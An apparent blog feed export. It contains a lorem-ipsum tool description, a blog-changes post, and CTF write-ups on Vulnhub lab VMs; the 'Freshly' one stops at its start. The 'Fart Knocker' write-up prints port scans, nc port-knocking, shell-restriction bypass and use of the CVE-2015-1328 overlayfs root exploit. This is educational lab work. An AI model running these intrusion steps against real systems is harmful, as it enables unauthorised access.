&lt;p&gt;The program take in argument a integer and a "type" of text. The available
"type" of text are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;words (--words, -w)&lt;/li&gt;
&lt;li&gt;sentences (--sentences, -s)&lt;/li&gt;
&lt;li&gt;paragraphs (--paragraphs, -p)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The integer will indicate how many quantity of this object it should print.&lt;/p&gt;
&lt;p&gt;An optional argument (--lorem, -l) will put "Lorem ipsum dolor sit amet," at the
beginning of the generated text.&lt;/p&gt;
&lt;p&gt;And for instance:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./localipsum.py --sentences 5
Crutch&amp;#39;s just dissociable pick, janitors contractions appropriating multipliers
beguiling patrimonial escorted opalescent penetrations coweringly forging await
furtive northland roves humidification relentlessly tomb&amp;#39;s will. Styrofoam
pediatric exposer incubator&amp;#39;s exam alibi&amp;#39;s misnomer, vi scope armpits swung
commutative osteopathic serving chortle dreading rates composite chalked expose
agreer preconceive magnanimity railroad. Filmstrip gases flatulent incant
footstep purchasing, gyroscope&amp;#39;s furtiveness nun putnam pungent genuineness
equator&amp;#39;s far transference. Carla bhutan, soundings protect jabbing knower
pyramids reintroducing riven cumbersome. Siltstone consider amphibole,
incident&amp;#39;s cherub clam&amp;#39;s should carolingian expired abatement charlemagne.
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Dictionaries&lt;/h2&gt;
&lt;p&gt;The program use the dictionaries from the &lt;code&gt;./locations&lt;/code&gt; file (one path per
line). Some basic dictionaries are already in it.&lt;/p&gt;
&lt;h3&gt;/usr/share/dict/&lt;/h3&gt;
&lt;p&gt;This directory may contain dictionaries on Unix system, on my own it contain a
dictionary for passwords cracking.&lt;/p&gt;
&lt;h3&gt;Firefox&lt;/h3&gt;
&lt;p&gt;The Firefox dictionaries are located in a file like:
&lt;code&gt;~/.mozilla/firefox/xxxxxxxx.default/extensions/fr-dicollecte@dictionaries.addons.mozilla.org/dictionaries/&lt;/code&gt;
where xxxxxxxx is the identifier of your Firefox profile.&lt;/p&gt;
&lt;p&gt;If you have more than one profile each one will have a different name.&lt;/p&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;p&gt;The vim dictionaries are &lt;code&gt;spl&lt;/code&gt; and &lt;code&gt;sug&lt;/code&gt; files. The main ones are located in a
path like &lt;code&gt;/usr/share/vim/vimXX/spell/&lt;/code&gt; where XX is your version of vim (for me
it is 74 right now).&lt;/p&gt;
&lt;p&gt;Your personal dictionaries are located in &lt;code&gt;~/.vim/spell/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This files are not directly readable in python. The command &lt;code&gt;vim -c spelldump&lt;/code&gt;
let you display the current dictionary in a vim buffer. From there it is quit
simple to redirect it to a file. Nevertheless this suppose that vim is install
on the system and the file are not clean and include lots of non word in them.&lt;/p&gt;
&lt;p&gt;I choose not to include them in the program for now.&lt;/p&gt;
&lt;h2&gt;Technical stuff&lt;/h2&gt;
&lt;p&gt;The program is written in python 3, it is actually 128 lines written in 29
commits.&lt;/p&gt;
&lt;p&gt;It supposes that that the paths are Unix like.&lt;/p&gt;
&lt;h3&gt;Random generation&lt;/h3&gt;
&lt;p&gt;The &lt;strong&gt;words&lt;/strong&gt; are chosen with the &lt;code&gt;random.randint(0, len(dictionaries)-1)&lt;/code&gt; function.
We also put a comma if there is more than 7 words. This comma is placed randomly
with more and more probability to be place as the words are generated.&lt;/p&gt;
&lt;p&gt;In order to generate &lt;strong&gt;sentences&lt;/strong&gt;, we suppose that one sentence is composed of 10
to 25 words.&lt;/p&gt;
&lt;p&gt;In order to generate &lt;strong&gt;paragraphs&lt;/strong&gt;, we suppose that one paragraph is composed from
4 to 8 sentences.&lt;/p&gt;</content><category term="python"></category><category term="programming"></category><category term="lorem ipsum"></category></entry><entry><title>Vulnhub - Fart Knocker</title><link href="https://matthieukeller.com/2015/06/vulnhub-fart-knocker.html" rel="alternate"></link><published>2015-06-16T23:30:00+02:00</published><updated>2015-06-16T23:30:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-06-16:/2015/06/vulnhub-fart-knocker.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.06/beavis_butthead.jpg" alt="beavis and butthead" width="262"&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine an started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/"&gt;TopHatSec - Fart Knocker&lt;/a&gt;.
This VM is an Ubuntu 14.04 32 bits.&lt;/p&gt;
&lt;p&gt;The goal of this challenge is to break into the machine and root it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you beat the box then please shoot me an email! Have fun guys!
P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
day. Otherwise you kids might not understand :)&lt;/p&gt;
&lt;/blockquote&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.06/beavis_butthead.jpg" alt="beavis and butthead" width="262"&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine an started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/"&gt;TopHatSec - Fart Knocker&lt;/a&gt;.
This VM is an Ubuntu 14.04 32 bits.&lt;/p&gt;
&lt;p&gt;The goal of this challenge is to break into the machine and root it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you beat the box then please shoot me an email! Have fun guys!
P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
day. Otherwise you kids might not understand :)&lt;/p&gt;
&lt;/blockquote&gt;


&lt;h1&gt;Discovery&lt;/h1&gt;
&lt;p&gt;First of all we determine the VM IP address a with a simple &lt;code&gt;nmap -sP&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Nmap&lt;/h2&gt;
&lt;p&gt;As always we start by &lt;a href="http://nmap.org/"&gt;nmaping&lt;/a&gt; the server in order to see the open ports:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@arch FartKnocker]$ nmap -A 10.0.2.6
# Nmap 6.47 scan initiated Thu Apr 23 16:21:05 2015 as: nmap -oA nmap -A 10.0.2.6
Nmap scan report for 10.0.2.6
Host is up (0.0034s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn&amp;#39;t have a title (text/html).

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Thu Apr 23 16:21:12 2015 -- 1 IP address (1 host up) scanned in 6.98 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Only the port 80 is open with an HTTP server.&lt;/p&gt;
&lt;p&gt;As always I had launch a &lt;a href="https://cirt.net/nikto2"&gt;nikto&lt;/a&gt; against the server
but no interesting result.&lt;/p&gt;
&lt;h1&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;We go to the web page and only found a pcap file which is a capture of some
network traffic.&lt;/p&gt;
&lt;h2&gt;pcap1&lt;/h2&gt;
&lt;p&gt;We analyse the &lt;code&gt;pcap1.pcap&lt;/code&gt; file. The packets and the VM name leads us to ports
knocking. As I do not know anything about it I have done some research on internet to
understand the principle (which is quite simple: send packets to a ports sequence
will open an other port) and fund a
&lt;a href="https://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/"&gt;basic script to knock&lt;/a&gt;.
I adapt it to my need and launch it against the target. The script will knock on
the sequence ports extract from the pcap file (it is quite simple to read with
&lt;a href="https://www.wireshark.org/"&gt;wireshark&lt;/a&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@arch FartKnocker]$ sudo python2 script.py
WARNING: No route found for IPv6 destination :: (no default route?)
[*] Knocking on 10.0.2.6:7000
[*] Knocking on 10.0.2.6:8000
[*] Knocking on 10.0.2.6:9000
[*] Knocking on 10.0.2.6:7000
[*] Knocking on 10.0.2.6:8000
[*] Knocking on 10.0.2.6:9000
[*] Knocking on 10.0.2.6:8888
[*] Scanning for open ports using nmap
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A &lt;a href="http://nmap.org/"&gt;nmap&lt;/a&gt; scan is launched after the knocking sequence to see
what port will open:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 16:35 CEST
Nmap scan report for 10.0.2.6
Host is up (0.00060s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE         VERSION
80/tcp   open  http            Apache httpd 2.4.7 ((Ubuntu))
8888/tcp open  sun-answerbook?

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This port run an other HTTP service which give us a second url &lt;code&gt;/burgerworld&lt;/code&gt;
and a second pcap file.&lt;/p&gt;
&lt;h2&gt;pcap2&lt;/h2&gt;
&lt;p&gt;After trying a bit to replay and understand the file I used the follow  TCP
stream function from &lt;a href="https://www.wireshark.org"&gt;wireshark&lt;/a&gt;, and the following
appears:&lt;/p&gt;
&lt;p&gt;&lt;img alt="eins drei drei sieben" src="/media/2015.06/beavis.jpg"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;eins drei drei sieben&lt;/strong&gt; means one, three, three, seven (7 years of German at least
useful, well it was of some use during the NDH qualifications too).&lt;/p&gt;
&lt;p&gt;Once again we knock on port 1, 3, 3 and 7, the port 1337 open and show us an
other URL: &lt;code&gt;/iamcornholio/&lt;/code&gt;. We got some code looking like base64.&lt;/p&gt;
&lt;h2&gt;base64&lt;/h2&gt;
&lt;p&gt;The code is:  T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK which is (after
base64 decode) "Open up SSH: 8888 9999 7777 6666". Once more, port knocking on
port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nc 10.0.2.6 8888
nc 10.0.2.6 9999
nc 10.0.2.6 7777
nc 10.0.2.6 6666
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Once more we launch nmap to see if a port was opened:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@arch FartKnocker]$ nmap  -A 10.0.2.6

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-28 13:32 CEST
Nmap scan report for 10.0.2.6
Host is up (0.0013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|   1024 8d:1f:97:c6:4d:e9:1d:2b:5d:b8:6e:64:66:bb:48:2b (DSA)
|   2048 02:31:1c:77:aa:c1:f6:2b:d3:09:f6:e0:63:fe:a9:37 (RSA)
|_  256 fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn&amp;#39;t have a title (text/html).

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Well, the ssh port 22 is now open.&lt;/p&gt;
&lt;h2&gt;SSH&lt;/h2&gt;
&lt;p&gt;We try to connect to it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@arch FartKnocker]$ ssh 10.0.2.6
The authenticity of host &amp;#39;10.0.2.6 (10.0.2.6)&amp;#39; can&amp;#39;t be established.
ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &amp;#39;10.0.2.6&amp;#39; (ECDSA) to the list of known hosts.
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The password and username are given by the ssh message, we should use them
directly:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
butthead@10.0.2.6&amp;#39;s password:
Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102
You are only logging in for a split second! What do you do!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got an ssh connection but we are logout immediately.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;I will no more put the CONGRATS message for your own sanity.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We execute a command directly within the ssh command (a classic ssh feature):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead ls
nachos
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The commands is executed, my first reaction was to read &lt;code&gt;/etc/passwd/&lt;/code&gt; as the
flag was there in
&lt;a href="http://matthieukeller.com/2015/04/vulnhub-freshly.html"&gt;the last TopHatSec challenge&lt;/a&gt;
but this is not so simple this time. Nevertheless we can get a shell buy using
&lt;code&gt;/bin/bash/&lt;/code&gt;. We read the &lt;code&gt;nachos&lt;/code&gt; file in buttheads's home:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cat nachos
Great job on getting this far.

Can you login as beavis or root ?
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The next step seems to get a beavis or root shell from the butthead one. This a
privilege escalation.&lt;/p&gt;
&lt;h2&gt;Guessing&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; during my long guessing period for privilege escalation I looked at
the other writeup to see if I missed something but they all used password
bruteforce. I do not like bruteforce, so I continue looking for something else.&lt;/p&gt;
&lt;p&gt;This part was the hardest of this challenge. It take me three weeks (not at full
time of course) to get over with it. I will give you some of my guessing steps:&lt;/p&gt;
&lt;p&gt;First of all to get a shell we just need to modify the &lt;code&gt;.profil&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sed &amp;#39;s/exit//&amp;#39; -i .profile
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let see what there is in beavis' home:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls /home/beavis
html
nc1.sh
ncone
nctwo
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There was a lot of netcat scripts but none of them allow us to make our privilege
escalation.&lt;/p&gt;
&lt;p&gt;Looking for a solution to get login as beavis, we notice that there was more
pcap files at our disposal :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls /var/www/html -R
/var/www/html:
burgerworld
iamcornholio
index.html
pcap1.pcap
spanishfly

/var/www/html/burgerworld:
index.html
pcap2.pcap

/var/www/html/iamcornholio:
index.html
pcap3.pcap

/var/www/html/spanishfly:
pcap4.pcap
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Even more troll: there is a folder &lt;code&gt;/var/backups/&lt;/code&gt; containing backups from the
&lt;code&gt;/etc/shadow&lt;/code&gt; file (which could be useful to crack the password):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;butthead@Huhuhhhhhuhuhhh:~$ ls -la /var/backups/
total 4872
drwxr-xr-x  2 root root      4096 Apr 28 06:25 .
drwxr-xr-x 12 root root      4096 Mar  2 17:45 ..
-rw-r--r--  1 root root      7380 Mar  2 23:39 apt.extended_states.0
-rw-r--r--  1 root root   4516724 Mar  2 16:45 aptitude.pkgstates.0
-rw-r--r--  1 root root    437586 Mar  2 23:39 dpkg.status.0
-rw-------  1 root root       690 Mar  3 00:30 group.bak
-rw-------  1 root shadow     577 Mar  3 00:30 gshadow.bak
-rw-------  1 root root      1143 Mar  3 00:30 passwd.bak
-rw-------  1 root shadow     939 Mar  3 00:30 shadow.bak
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This backups are copied by the daily crontab. A solution may be to attempt to a
race condition against it. I have not dig into the subject.&lt;/p&gt;
&lt;p&gt;I also used
&lt;a href="http://pentestmonkey.net/tools/audit/unix-privesc-check"&gt;unix-privsec-check&lt;/a&gt;
in order to search for the privilege escalation.&lt;/p&gt;
&lt;h2&gt;CVE-2015-1328&lt;/h2&gt;
&lt;p&gt;I had a bit stop to search for the privilege escalation when I saw that an
exploit as been published for the
&lt;a href="http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html"&gt;CVE-2015-1328&lt;/a&gt;,
which use the incorrect permission check in overlayfs in Ubuntu to give root
privileges: &lt;a href="http://seclists.org/oss-sec/2015/q2/717"&gt;http://seclists.org/oss-sec/2015/q2/717&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Hopefully we are on a vulnerable Ubuntu. So I compiled &lt;code&gt;ofs.c&lt;/code&gt; with &lt;code&gt;gcc&lt;/code&gt; and
launch it, well it works and give me immediately a root shell.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@Huhuhhhhhuhuhhh:/home/butthead# cat /root/SECRETZ
You have done a great job, if you can see this, please shoot me an email
and let me know that you have beat this box!

SECRET = &amp;quot;LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK&amp;quot;

admin@top-hat-sec.com
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a nice challenge as I learned a lot about the port knocking. The
privilege escalation was quit interesting to search for and the CVE-2015-1328
exploitation was a lot of fun.&lt;/p&gt;
&lt;p&gt;Thank you &lt;a href="http://top-hat-sec.com"&gt;top-hat-sec&lt;/a&gt; for this challenge and
&lt;a href="http://vulnhub.com"&gt;vulnhub&lt;/a&gt; as always.&lt;/p&gt;</content><category term="challenge"></category><category term="security"></category></entry><entry><title>Blog changes #2</title><link href="https://matthieukeller.com/2015/05/blog-changes-2.html" rel="alternate"></link><published>2015-05-15T16:30:00+02:00</published><updated>2015-05-15T16:30:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-05-15:/2015/05/blog-changes-2.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.05/site.png" alt="blog screenshot" width="262"&gt;&lt;/p&gt;
&lt;p&gt;There was a lot of changes lately on the blog. I rewrite the urls, I moved the
notes section, I displayed the categories in the menu, add a favicon and add a
markdown plugin.&lt;/p&gt;
&lt;p&gt;I wrote more "about" pages, separating the "about me" and "about website" pages and
creating a sports pages with my time for each race I run.&lt;/p&gt;
&lt;p&gt;I also tweak the theme by adding icons, adding borders around code blocs,
putting the same CSS to pages as to articles and some minors improvements.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.05/site.png" alt="blog screenshot" width="262"&gt;&lt;/p&gt;
&lt;p&gt;There was a lot of changes lately on the blog. I rewrite the urls, I moved the
notes section, I displayed the categories in the menu, add a favicon and add a
markdown plugin.&lt;/p&gt;
&lt;p&gt;I wrote more "about" pages, separating the "about me" and "about website" pages and
creating a sports pages with my time for each race I run.&lt;/p&gt;
&lt;p&gt;I also tweak the theme by adding icons, adding borders around code blocs,
putting the same CSS to pages as to articles and some minors improvements.&lt;/p&gt;


&lt;h1&gt;Site changes&lt;/h1&gt;
&lt;h2&gt;URLs&lt;/h2&gt;
&lt;p&gt;First of all I moved the blog from www.matthieukeller.com/blog to
www.matthieukeller.com and then to matthieukeller.com. The first change allow
me to delete the ugly and useless portal page. The second one allow me to move
from the 90's.&lt;/p&gt;
&lt;p&gt;Moreover I correct some of my configuration which lead to 404 pages when using
author and category links inside an article.&lt;/p&gt;
&lt;h2&gt;Notes&lt;/h2&gt;
&lt;p&gt;There was two part of the website, the /blog and the /notes.
First of all I moved the about pages which where located in the notes section
and put it as a &lt;a href="/pages/about.html"&gt;static page in the /blog&lt;/a&gt; part and then I
moved all the notes into &lt;a href="/pages/notes.html"&gt;a notes page&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Error page&lt;/h2&gt;
&lt;p&gt;I remove the 404 page from github to put my own with a link to the
&lt;a href="/archives.html"&gt;archives&lt;/a&gt; and to the &lt;a href="/pages/notes.html"&gt;notes&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Categories&lt;/h2&gt;
&lt;p&gt;I Display the category in the menu. A theme change was needed as the original
one does not handle them.&lt;/p&gt;
&lt;h2&gt;Plugin&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;I use the
   &lt;a href="https://github.com/getpelican/pelican-plugins/tree/master/summary"&gt;Summary pelican plugin&lt;/a&gt;
   in order to control the summary size.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I use the
   &lt;a href="https://pythonhosted.org/Markdown/extensions/toc.html"&gt;toc markdwon plugin&lt;/a&gt;
   in order to make a simple table of content.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I use &lt;a href="http://www.google.com/analytic"&gt;Google Analytics&lt;/a&gt; in order to track
   the number of visitor (you can disable javascript if you do not want to be
   tracked).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Favicon&lt;/h2&gt;
&lt;p&gt;I add a favicon to the website.&lt;/p&gt;
&lt;h2&gt;About pages&lt;/h2&gt;
&lt;p&gt;I separate the &lt;a href="/pages/about.html"&gt;about page&lt;/a&gt; from the
&lt;a href="/pages/about-this-website.html"&gt;about website pages&lt;/a&gt; and wrote a &lt;a href="pages/palmares.html"&gt;sport
page&lt;/a&gt; with my personal records for races and a link to the
&lt;a href="http://strava.com"&gt;Strava&lt;/a&gt; gps trace.&lt;/p&gt;
&lt;h1&gt;Theme tweaking&lt;/h1&gt;
&lt;p&gt;It tweak the &lt;a href="https://github.com/kplaube/maggner-pelican"&gt;maggner pelican theme&lt;/a&gt;
a lot and &lt;a href="https://github.com/maggick/maggner-pelican"&gt;my repository&lt;/a&gt; is in
advance of a few commits compared to the original one. In fact I add a few
features to the theme:&lt;/p&gt;
&lt;p&gt;A menu section to be added in the config file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;MENUITEMS = (
  (&amp;#39;Notes&amp;#39;, &amp;#39;https://www.matthieukeller.com/notes&amp;#39;),
  (&amp;#39;RSS / ATOM feed&amp;#39;, &amp;#39;http://www.matthieukeller.com/blog/feeds/all.atom.xml&amp;#39;),)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A link section (blogroll) as in the main pelican themes, also configurable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Blogroll
LINKS = ((&amp;#39;Pelican&amp;#39;, &amp;#39;http://getpelican.com/&amp;#39;),
     (&amp;#39;Python.org&amp;#39;, &amp;#39;http://python.org/&amp;#39;),
     (&amp;#39;Jinja2&amp;#39;, &amp;#39;http://jinja.pocoo.org/&amp;#39;),)
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;In the archives, the date is before the article and its format is like
   '24 May 2015'.&lt;/li&gt;
&lt;li&gt;The social buttons at the end of an article are now configured in the pelican
   configuration.&lt;/li&gt;
&lt;li&gt;In the archives the date and the article title are separated with some space.&lt;/li&gt;
&lt;li&gt;The categories can be display in the menu.&lt;/li&gt;
&lt;li&gt;The social links are preceded with the corresponding social icon.&lt;/li&gt;
&lt;li&gt;The archives and feeds links are preceded with a nice icon.&lt;/li&gt;
&lt;li&gt;The pages CSS will now be the same as the articles one. For instance the
   links in the pages are now in red as there were like the rest of the text
   before.&lt;/li&gt;
&lt;li&gt;Add a border to each bloc of code.&lt;/li&gt;
&lt;/ul&gt;</content><category term="Blog"></category></entry><entry><title>Vulnhub - Freshly</title><link href="https://matthieukeller.com/2015/04/vulnhub-freshly.html" rel="alternate"></link><published>2015-04-20T00:00:00+02:00</published><updated>2015-04-20T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-04-20:/2015/04/vulnhub-freshly.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"
alt="not the droids" width="262"&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine and started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/"&gt;TopHatSec - Freshly&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;"The goal of this challenge is to break into the machine via the web and find the
secret hidden in a sensitive file. If you can find the secret, send me an email
for verification. :)"&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"
alt="not the droids" width="262"&gt;&lt;/p&gt;
&lt;p&gt;I continued to play with the vulnhub virtual machine and started the
&lt;a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/"&gt;TopHatSec - Freshly&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;"The goal of this challenge is to break into the machine via the web and find the
secret hidden in a sensitive file. If you can find the secret, send me an email
for verification. :)"&lt;/p&gt;


&lt;h1&gt;Discovery&lt;/h1&gt;
&lt;p&gt;As always we need to know which ports are open.&lt;/p&gt;
&lt;h2&gt;nmap&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Nmap 6.47 scan initiated Thu Apr 16 19:13:39 2015 as: nmap -A -A -oA nmap 10.0.2.5
Nmap scan report for 10.0.2.5
Host is up (0.00087s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn&amp;#39;t have a title (text/html).
443/tcp  open  ssl/http Apache httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&amp;#39;t have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-02-17T03:30:05+00:00
|_Not valid after:  2025-02-14T03:30:05+00:00
|_ssl-date: 2047-09-11T02:34:36+00:00; +32y147d13h20m44s from local time.
8080/tcp open  http     Apache httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&amp;#39;t have a title (text/html).

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Thu Apr 16 19:13:52 2015 -- 1 IP address (1 host up) scanned in 12.77 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is three ports with a web server running:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The 80 just display an gif.&lt;/li&gt;
&lt;li&gt;The 443 seems to be like the 8080 with SSL.&lt;/li&gt;
&lt;li&gt;The 8080 is a wordpress website which seems to sell candy (who doesn't love
      candy?).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="not the droids" src="/media/2015.04/index_html_tumblr_mdeo27ZZjB1r6pf3eo1_500.gif"&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;I try to see if there was any differences between this gif and the original
one, but nothing.&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;Nikto&lt;/h2&gt;
&lt;p&gt;I like to use &lt;a href="https://cirt.net/Nikto2"&gt;Nikto&lt;/a&gt; when discovering website, I will put only the
interesting stuff, but I ran &lt;a href="https://cirt.net/Nikto2"&gt;Nikto&lt;/a&gt; on the 3 ports.&lt;/p&gt;
&lt;p&gt;Port 80:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine Freshly]$ nikto -host 10.0.2.5
Server: Apache/2.4.7 (Ubuntu)
+ /login.php: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;img alt="login.php" src="/media/2015.04/login.php.png"&gt;&lt;/p&gt;
&lt;p&gt;Port 8080:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine Freshly]$ nikto -host 10.0.2.5 -port 8080
+ OSVDB-3268: /img/: Directory indexing found.
+ /wordpress/: A Wordpress installation was found
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got two login interfaces and a directory listing with images. Let's take a
look at the wordpress installation.&lt;/p&gt;
&lt;p&gt;&lt;img alt="wordpress, index" src="/media/2015.04/wordpress_index.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The directory listening was not of any use. As well the phpmyadmin interface
was not usefull.&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;WPScan&lt;/h2&gt;
